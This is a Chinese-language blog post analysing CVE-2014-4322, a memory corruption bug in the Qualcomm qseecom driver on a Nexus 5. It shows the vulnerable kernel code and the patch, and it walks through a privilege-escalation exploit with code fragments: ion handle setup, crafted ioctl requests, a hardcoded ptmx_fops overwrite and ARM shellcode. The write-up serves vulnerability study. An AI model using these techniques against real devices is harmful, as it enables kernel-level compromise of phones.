<!DOCTYPE html>
<html lang="zh-Hans">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="CVE-2014-4322-qseecom内存破坏漏洞分析"/>







  <link rel="alternate" href="/atom.xml" title="Ele7enxxh's Blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.png?v=2.2.x" />



<link rel="canonical" href="http://ele7enxxh.com/Memory-Corruption-Qseecom-Driver-CVE-2014-4322-Analysis.html"/>


<meta name="description" content="本文主要研究了CVE-2014-4322-qseecom内存破坏漏洞的原理与利用。">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2014-4322-qseecom内存破坏漏洞分析">
<meta property="og:url" content="http://ele7enxxh.com/Memory-Corruption-Qseecom-Driver-CVE-2014-4322-Analysis.html">
<meta property="og:site_name" content="Ele7enxxh's Blog">
<meta property="og:description" content="本文主要研究了CVE-2014-4322-qseecom内存破坏漏洞的原理与利用。">
<meta property="og:updated_time" content="2016-03-23T06:31:01.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2014-4322-qseecom内存破坏漏洞分析">
<meta name="twitter:description" content="本文主要研究了CVE-2014-4322-qseecom内存破坏漏洞的原理与利用。">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.2.x" />



  <link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />





<script>
  var CONFIG = {
    search: true,
    searchPath: "/search.xml",
    fancybox: true,
    toc: true,
  }
</script>




  
  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?e9925f9b47e12674b38b04ce3cde49e6";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




    <title> CVE-2014-4322-qseecom内存破坏漏洞分析 · Ele7enxxh's Blog </title>
  </head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">Ele7enxxh's Blog</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    
      <a href="/">
        <li class="mobile-menu-item">
          
          
            Home
          
        </li>
      </a>
    
      <a href="/archives/">
        <li class="mobile-menu-item">
          
          
            Archives
          
        </li>
      </a>
    
  </ul>
</nav>

    <div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">Ele7enxxh's Blog</a>
</div>

<nav class="site-navbar">
  
    <ul id="menu" class="menu">
      
        <li class="menu-item">
          <a class="menu-item-link" href="/">
            
            
              Home
            
          </a>
        </li>
      
        <li class="menu-item">
          <a class="menu-item-link" href="/archives/">
            
            
              Archives
            
          </a>
        </li>
      
      
        <li class="menu-search">
          <form>
            <i class="iconfont icon-search" id="open-search"></i>
            <input type="text" class="search-input" id="search-input" />
            <i class="iconfont icon-close" id="close-search"></i>
          </form>
        </li>
      
    </ul>
  
</nav>
      </header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content">
            
  
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          CVE-2014-4322-qseecom内存破坏漏洞分析
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          Jul 26, 2015
        </span>
      </div>
    </header>

    
    
  <div class="post-toc" id="post-toc">
    <h2 class="post-toc-title">Contents</h2>
    <div class="post-toc-content">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析环境与工具"><span class="toc-text">分析环境与工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-text">后记</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文献"><span class="toc-text">参考文献</span></a></li></ol>
    </div>
  </div>


    <div class="post-content">
      
        <p>本文主要研究了CVE-2014-4322-qseecom内存破坏漏洞的原理与利用。<a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
<p>QSEECOM驱动程序提供了ioctl系统调用接口，用于用户空间客户端的通讯。<br>QSEECOM driver的drivers/misc/qseecom.c没有验证ioctl调用中的某些偏移、长度、基值，攻击者通过构造的应用，利用此漏洞可获取提升的权限或造成拒绝服务。</p>
</blockquote>
<h2 id="分析环境与工具"><a href="#分析环境与工具" class="headerlink" title="分析环境与工具"></a>分析环境与工具</h2><p>Android版本：Android4.4.4_r1<br>内核版本：kernel_msm-android-msm-hammerhead-3.4-kitkat-mr1<br>手机：Nexus5</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>接下来我将结合retme在xkungfoo2015安全会议做出的报告对该漏洞的exploit原理进行详细分析。看一下codeaurora对该漏洞的简介：</p>
<blockquote>
<p>The qseecom driver provides an ioctl system call interface to user space clients for communication. When processing this communication, the __qseecom_update_cmd_buf function uses the user-supplied value cmd_buf_offset as an index to a buffer for write operations without any boundary checks, allowing a local application with access to the qseecom device node to, e.g., escalate privileges.</p>
</blockquote>
<p>显然问题出在__qseecom_update_cmd_buf函数没有对用户传入的参数进行边界检查，导致了内存破坏。对该漏洞的patch时在函数入口添加了一个边界检查的函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">boundary_checks_offset</span><span class="params">(<span class="keyword">struct</span> qseecom_send_modfd_cmd_req *cmd_req,</span></span></div><div class="line">	<span class="keyword">struct</span> qseecom_send_modfd_listener_resp *lstnr_resp,</div><div class="line">	<span class="keyword">struct</span> qseecom_dev_handle *data, <span class="keyword">bool</span> listener_svc,</div><div class="line">	<span class="keyword">int</span> i) &#123;</div><div class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</div><div class="line">	<span class="keyword">if</span> ((!listener_svc) &amp;&amp; (cmd_req-&gt;ifd_data[i].fd &gt; <span class="number">0</span>)) &#123;</div><div class="line">		<span class="keyword">if</span> (cmd_req-&gt;ifd_data[i].cmd_buf_offset &gt; </div><div class="line">			cmd_req-&gt;cmd_req_len - <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>)) &#123;</div><div class="line">			pr_err(<span class="string">"Invalid offset 0x%x\n"</span>,</div><div class="line">				cmd_req-&gt;ifd_data[i].cmd_buf_offset);</div><div class="line">			<span class="keyword">return</span> ++ret;</div><div class="line">		&#125;</div><div class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((listener_svc) &amp;&amp; (lstnr_resp-&gt;ifd_data[i].fd &gt; <span class="number">0</span>)) &#123;</div><div class="line">		<span class="keyword">if</span> (lstnr_resp-&gt;ifd_data[i].cmd_buf_offset &gt;</div><div class="line">			lstnr_resp-&gt;resp_len - <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>)) &#123;</div><div class="line">			pr_err(<span class="string">"Invalid offset 0x%x\n"</span>,</div><div class="line">				lstnr_resp-&gt;ifd_data[i].cmd_buf_offset);</div><div class="line">			<span class="keyword">return</span> ++ret;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> ret;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>查看__qseecom_update_cmd_buf函数源码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">int</span> __qseecom_update_cmd_buf(<span class="keyword">struct</span></div><div class="line">qseecom_send_modfd_cmd_req *req,...)</div><div class="line">&#123;</div><div class="line">...</div><div class="line">    <span class="comment">/* Get the handle of the shared fd */</span></div><div class="line">	ihandle = ion_import_dma_buf(qseecom.ion_clnt, req-&gt;ifd_data[i].fd);</div><div class="line">	<span class="keyword">if</span> (IS_ERR_OR_NULL(ihandle)) &#123;</div><div class="line">		pr_err(<span class="string">"Ion client can't retrieve the handle\n"</span>);</div><div class="line">		<span class="keyword">return</span> -ENOMEM;</div><div class="line">	&#125;</div><div class="line">	field = (<span class="keyword">char</span> *) req-&gt;cmd_req_buf + req-&gt;ifd_data[i].cmd_buf_offset;</div><div class="line">	<span class="comment">/* Populate the cmd data structure with the phys_addr */</span></div><div class="line">	sg_ptr = ion_sg_table(qseecom.ion_clnt, ihandle);</div><div class="line">...</div><div class="line">	update = (<span class="keyword">uint32_t</span> *) field;</div><div class="line">	<span class="keyword">if</span> (cleanup)</div><div class="line">		*update = <span class="number">0</span>;</div><div class="line">	<span class="keyword">else</span></div><div class="line">		*update = (<span class="keyword">uint32_t</span>)sg_dma_address(sg_ptr-&gt;sgl);</div><div class="line">...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里我隐藏了无关的代码，只贴出了涉及本漏洞的部分。req-&gt;cmd_req_buf为用户态传入的缓冲区基地址，req-&gt;ifd_data[i].cmd_buf_offset为相对于req_buf的偏移，sg_dma_address返回一个物理地址。值得注意的是，req-&gt;cmd_req_buf和req-&gt;ifd_data[i].cmd_buf_offset的值都是用户态传入的，并且没有任何限制。</p>
<p>假定sg_dma_address(sg_ptr-&gt;sgl)返回的是一个固定的物理地址，如0x3*******，我们可以构造出该漏洞的利用思路：</p>
<ol>
<li>构造用户态参数，调用ioctl触发__qseecom_update_cmd_buf函数，将0x3*******泄露回用户态，得到确切地址；</li>
<li>构造用户态参数，再次调用ioctl触发__qseecom_update_cmd_buf函数，覆盖ptmx_fops结构体的fsync函数指针；</li>
<li>在0x3*******地址mmap一段空间，并布置相应的shellcode；</li>
<li>调用fsync(/dev/ptmx)触发内核调用shellcode，完成提权；</li>
</ol>
<p>首先来看如何在用户态触发req-&gt;cmd_req_buf函数，搜索__qseecom_update_cmd_buf：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">qseecom_send_modfd_cmd</span><span class="params">(<span class="keyword">struct</span> qseecom_dev_handle *data,</span></span></div><div class="line">					<span class="keyword">void</span> __user *argp)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</div><div class="line">	<span class="keyword">struct</span> qseecom_send_modfd_cmd_req req;</div><div class="line">	<span class="keyword">struct</span> qseecom_send_cmd_req send_cmd_req;</div><div class="line">	ret = copy_from_user(&amp;req, argp, <span class="keyword">sizeof</span>(req));</div><div class="line">	<span class="keyword">if</span> (ret) &#123;</div><div class="line">		pr_err(<span class="string">"copy_from_user failed\n"</span>);</div><div class="line">		<span class="keyword">return</span> ret;</div><div class="line">	&#125;</div><div class="line">	send_cmd_req.cmd_req_buf = req.cmd_req_buf;</div><div class="line">	send_cmd_req.cmd_req_len = req.cmd_req_len;</div><div class="line">	send_cmd_req.resp_buf = req.resp_buf;</div><div class="line">	send_cmd_req.resp_len = req.resp_len;</div><div class="line">	ret = __qseecom_update_cmd_buf(&amp;req, <span class="literal">false</span>);</div><div class="line">	<span class="keyword">if</span> (ret)</div><div class="line">		<span class="keyword">return</span> ret;</div><div class="line">	ret = __qseecom_send_cmd(data, &amp;send_cmd_req);</div><div class="line">	<span class="keyword">if</span> (ret)</div><div class="line">		<span class="keyword">return</span> ret;</div><div class="line">	ret = __qseecom_update_cmd_buf(&amp;req, <span class="literal">true</span>);</div><div class="line">	<span class="keyword">if</span> (ret)</div><div class="line">		<span class="keyword">return</span> ret;</div><div class="line">	pr_debug(<span class="string">"sending cmd_req-&gt;rsp size: %u, ptr: 0x%p\n"</span>,</div><div class="line">			req.resp_len, req.resp_buf);</div><div class="line">	<span class="keyword">return</span> ret;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>继续找qseecom_send_modfd_cmd的上层调用：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">qseecom_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="keyword">unsigned</span> cmd,</span></span></div><div class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</div><div class="line">&#123;</div><div class="line">...</div><div class="line">    <span class="keyword">case</span> QSEECOM_IOCTL_SEND_MODFD_CMD_REQ: &#123;</div><div class="line">		<span class="comment">/* Only one client allowed here at a time */</span></div><div class="line">		mutex_lock(&amp;app_access_lock);</div><div class="line">		atomic_inc(&amp;data-&gt;ioctl_count);</div><div class="line">		ret = qseecom_send_modfd_cmd(data, argp);</div><div class="line">		atomic_dec(&amp;data-&gt;ioctl_count);</div><div class="line">		wake_up_all(&amp;data-&gt;abort_wq);</div><div class="line">		mutex_unlock(&amp;app_access_lock);</div><div class="line">		<span class="keyword">if</span> (ret)</div><div class="line">			pr_err(<span class="string">"failed qseecom_send_cmd: %d\n"</span>, ret);</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>到这里就可以知道，命令码为QSEECOM_IOCTL_SEND_MODFD_CMD_REQ的ioctl函数调用，就可以触发qseecom驱动层__qseecom_update_cmd_buf函数。<br>让我们考虑如何构造用户态参数的问题，先贴出要用到的结构体：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"> * struct qseecom_ion_fd_info - ion fd handle data information</div><div class="line"> * @fd - ion handle to some memory allocated in user space</div><div class="line"> * @cmd_buf_offset - command buffer offset</div><div class="line"> */</div><div class="line"><span class="keyword">struct</span> qseecom_ion_fd_info &#123;</div><div class="line">	<span class="keyword">int32_t</span> fd;</div><div class="line">	<span class="keyword">uint32_t</span> cmd_buf_offset;</div><div class="line">&#125;;</div><div class="line"><span class="comment">/*</span></div><div class="line"> * struct qseecom_send_modfd_cmd_req - for send command ioctl request</div><div class="line"> * @cmd_req_len - command buffer length</div><div class="line"> * @cmd_req_buf - command buffer</div><div class="line"> * @resp_len - response buffer length</div><div class="line"> * @resp_buf - response buffer</div><div class="line"> * @ifd_data_fd - ion handle to memory allocated in user space</div><div class="line"> * @cmd_buf_offset - command buffer offset</div><div class="line"> */</div><div class="line"><span class="keyword">struct</span> qseecom_send_modfd_cmd_req &#123;</div><div class="line">	<span class="keyword">void</span> *cmd_req_buf; <span class="comment">/* in */</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> cmd_req_len; <span class="comment">/* in */</span></div><div class="line">	<span class="keyword">void</span> *resp_buf; <span class="comment">/* in/out */</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> resp_len; <span class="comment">/* in/out */</span></div><div class="line">	<span class="keyword">struct</span> qseecom_ion_fd_info ifd_data[MAX_ION_FD];</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>回到__qseecom_update_cmd_buf函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">int</span> __qseecom_update_cmd_buf(<span class="keyword">struct</span></div><div class="line">qseecom_send_modfd_cmd_req *req,...)</div><div class="line">&#123;</div><div class="line">...</div><div class="line">    <span class="comment">/* Get the handle of the shared fd */</span></div><div class="line">	ihandle = ion_import_dma_buf(qseecom.ion_clnt, req-&gt;ifd_data[i].fd);</div><div class="line">	<span class="keyword">if</span> (IS_ERR_OR_NULL(ihandle)) &#123;</div><div class="line">		pr_err(<span class="string">"Ion client can't retrieve the handle\n"</span>);</div><div class="line">		<span class="keyword">return</span> -ENOMEM;</div><div class="line">	&#125;</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>要继续触发后面的逻辑，我们需要构造req-&gt;ifd_data[i].fd参数，以保证ihandle的值不为空。根据上面结构体qseecom_ion_fd_info的注释，需要分配一个ion内存管理器的句柄，通过网上资料的查询，代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetIonSharedFd</span><span class="params">(<span class="keyword">int</span> length)</span> </span>&#123;</div><div class="line">	<span class="keyword">int</span> fd;</div><div class="line">	<span class="keyword">struct</span> ion_allocation_data allocation_data;</div><div class="line">	<span class="keyword">struct</span> ion_fd_data fd_data;</div><div class="line"></div><div class="line">	fd = open(<span class="string">"/dev/ion"</span>, O_RDONLY);</div><div class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</div><div class="line">		perror(<span class="string">"open /dev/ion"</span>);</div><div class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	allocation_data.len = length;</div><div class="line">	allocation_data.align = length;</div><div class="line">	allocation_data.flags = ION_HEAP_TYPE_CARVEOUT;</div><div class="line">	<span class="keyword">if</span> (ioctl(fd, ION_IOC_ALLOC, &amp;allocation_data) &lt; <span class="number">0</span>) &#123;</div><div class="line">		perror(<span class="string">"ION_IOC_ALLOC"</span>);</div><div class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	fd_data.handle = allocation_data.handle;</div><div class="line">	<span class="keyword">if</span> (ioctl(fd, ION_IOC_SHARE, &amp;fd_data) &lt; <span class="number">0</span>) &#123;</div><div class="line">		perror(<span class="string">"ION_IOC_SHARE"</span>);</div><div class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> fd_data.fd;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>所以ifd_data_fd构造如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> qseecom_send_modfd_cmd_req send_modfd_cmd_req;</div><div class="line">send_modfd_cmd_req.ifd_data[<span class="number">0</span>].fd = GetIonSharedFd(<span class="number">8192</span>);</div></pre></td></tr></table></figure></p>
<p>接着往下看__qseecom_update_cmd_buf函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">field = (<span class="keyword">char</span> *) req-&gt;cmd_req_buf + req-&gt;ifd_data[i].cmd_buf_offset;</div></pre></td></tr></table></figure></p>
<p>首先需要将物理地址泄露回用户态，参数构造如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> *abuse_buff;</div><div class="line">abuse_buff = <span class="built_in">malloc</span>(<span class="number">400</span>);</div><div class="line"><span class="built_in">memset</span>(abuse_buff, <span class="number">0</span>, <span class="number">400</span>);</div><div class="line">send_modfd_cmd_req.cmd_req_buf = abuse_buff;</div><div class="line">send_modfd_cmd_req.ifd_data[<span class="number">0</span>].cmd_buf_offset = <span class="number">0</span>;</div></pre></td></tr></table></figure></p>
<p>接着通过ioctl触发__qseecom_update_cmd_buf函数调用：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">field = (<span class="keyword">char</span> *) req-&gt;cmd_req_buf + req-&gt;ifd_data[i].cmd_buf_offset;</div><div class="line">      = (<span class="keyword">char</span> *) abuse_buff;</div><div class="line">update = (<span class="keyword">uint32_t</span> *) field;</div><div class="line">       = (<span class="keyword">uint32_t</span> *) abuse_buff;</div><div class="line">*update = (<span class="keyword">uint32_t</span>) sg_dma_addressji(sg_ptr-&gt;sgl); -&gt; ((<span class="keyword">uint32_t</span> *) abuse_buff)[<span class="number">0</span>] = (<span class="keyword">uint32_t</span>) sg_dma_addressji(sg_ptr-&gt;sgl);</div></pre></td></tr></table></figure></p>
<p>即abuse_buff[0]存放了内核态泄露出的物理地址0x3*******。接下来构造参数以覆盖fsync函数指针：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PTMX_FOPS 0xc1235dd0 <span class="comment">// 此处是ptmx_fops结构体的地址的硬编码</span></span></div><div class="line">send_modfd_cmd_req.ifd_data[<span class="number">0</span>].cmd_buf_offset = PTMX_FOPS + <span class="number">56</span> - (<span class="keyword">int</span>) abuse_buff; <span class="comment">// PTMX_FOPS + 56 的地址即为fsync</span></div></pre></td></tr></table></figure></p>
<p>继续通过ioctl触发__qseecom_update_cmd_buf函数调用：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">field = (<span class="keyword">char</span> *) req-&gt;cmd_req_buf + req-&gt;ifd_data[i].cmd_buf_offset;</div><div class="line">      = (<span class="keyword">char</span> *) (PTMX_FOPS + <span class="number">56</span>);</div><div class="line">update = (<span class="keyword">uint32_t</span> *) field;</div><div class="line">       = (<span class="keyword">uint32_t</span> *) (PTMX_FOPS + <span class="number">56</span>);</div><div class="line">*update = (<span class="keyword">uint32_t</span>) sg_dma_addressji(sg_ptr-&gt;sgl); -&gt; *((<span class="keyword">uint32_t</span> *) PTMX_FOPS + <span class="number">56</span>) = (<span class="keyword">uint32_t</span>) sg_dma_addressji(sg_ptr-&gt;sgl);</div></pre></td></tr></table></figure></p>
<p>这样fsync函数指针地址即被替换为了0x3*******，我们只需要在0x3*******地址布置shellcode即可：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> shellcode[] = &#123;<span class="number">0xe59f0004</span>, <span class="number">0xe92d0001</span>, <span class="number">0xe8bd8000</span>&#125;; <span class="comment">// ldr r0, [pc, $4], stmfd sp!, &#123;r0&#125;, ldmfd sp!, &#123;pc&#125;</span></div></pre></td></tr></table></figure></p>
<p>这里注意的是我们不能使用b系列的跳转指令，因为b系列指令是基于PC的相对偏移的。<br>最后访问/dev/ptmx，调用sync，shellcode将以内核权限执行，执行提权代码后，完成root。</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>qseecom设备需要system权限才能访问，所以我们首先需要提权到system才能利用该漏洞，比如CVE-2014-7911。<br>retme大神早就提供了POC，这篇博客也是分析了retme的POC和报告才有的。我在retme的POC的基础上精简了一些代码，需要的和我联系。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol>
<li><a href="https://github.com/retme7/CVE-2014-4322_poc" target="_blank" rel="external">https://github.com/retme7/CVE-2014-4322_poc</a></li>
<li><a href="https://github.com/android/kernel_msm/tree/android-msm-hammerhead-3.4-kitkat-mr1" target="_blank" rel="external">https://github.com/android/kernel_msm/tree/android-msm-hammerhead-3.4-kitkat-mr1</a></li>
<li><a href="https://github.com/android-rooting-tools/android_run_root_shell" target="_blank" rel="external">https://github.com/android-rooting-tools/android_run_root_shell</a></li>
</ol>

      
    </div>

    
      
      

  <div class="post-copyright">
    <p class="copyright-item">
      <span>作者: </span>
      <span>ele7enxxh</span>
    </p>
    <p class="copyright-item">
      <span>来源: </span>
      <a href="http://ele7enxxh.com">http://ele7enxxh.com</a>
    </p>
    <p class="copyright-item">
      <span>链接: </span>
      <a href="http://ele7enxxh.com/Memory-Corruption-Qseecom-Driver-CVE-2014-4322-Analysis.html">http://ele7enxxh.com/Memory-Corruption-Qseecom-Driver-CVE-2014-4322-Analysis.html</a>
    </p>

    <p class="copyright-item lincese">
      
      本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可
    </p>
  </div>



      
      
    

    
  </article>


          </div>
          
  <div class="comments" id="comments">
    
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    
  </div>

        </div>  
      </main>

      <footer id="footer" class="footer">

  <div class="social-links">
    
      
        
          <a href="mailto:ele7enxxh@qq.com" class="iconfont icon-email" title="email"></a>
        
      
    
      
    
      
    
      
    
      
    
      
    
      
        
          <a href="https://github.com/ele7enxxh" class="iconfont icon-github" title="github"></a>
        
      
    
      
        
          <a href="http://weibo.com/ele7enxxh" class="iconfont icon-weibo" title="weibo"></a>
        
      
    
      
    
      
    
    
    
      <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
    
  </div>


<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a>
  </span>
  
  <span class="theme-info">
    Theme - 
    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>

  <span class="copyright-year">
    
    &copy; 
     
      2015 - 
    
    2017

    <span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">ele7enxxh</span>
  </span>
</div>
      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>

    
  
  
  <script type="text/javascript">
    var disqus_config = function () {
        this.page.url = 'http://ele7enxxh.com/Memory-Corruption-Qseecom-Driver-CVE-2014-4322-Analysis.html';
        this.page.identifier = 'Memory-Corruption-Qseecom-Driver-CVE-2014-4322-Analysis.html';
        this.page.title = 'CVE-2014-4322-qseecom内存破坏漏洞分析';
    };
    (function() {
    var d = document, s = d.createElement('script');

    s.src = '//ele7enxxh.disqus.com/embed.js';

    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();  
  </script>




    
  





  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  
    <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  

  
    <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  


    <script type="text/javascript" src="/js/src/even.js?v=2.2.x"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=2.2.x"></script>

    
  <script type="text/html" id="search-result">
    <article class="post">
      <header class="post-header">
        <h1 class="post-title">
          <a href="$url$" class="post-link">
            $title$
          </a>
        </h1>
      </header>
      <div class="post-content">
        $content$
        <div class="read-more">
          <a href="$url$" class="read-more-link">
            Read more..
          </a>
        </div>
      </div>
    </article>
  </script>
  <script type="text/html" id="no-search-result">
    <div class="no-result">
      <h2>No result found!</h2>
    </div>
  </script>
  <script type="text/javascript" src="/js/src/search.js?v=2.2.x"></script>

  </body>
</html>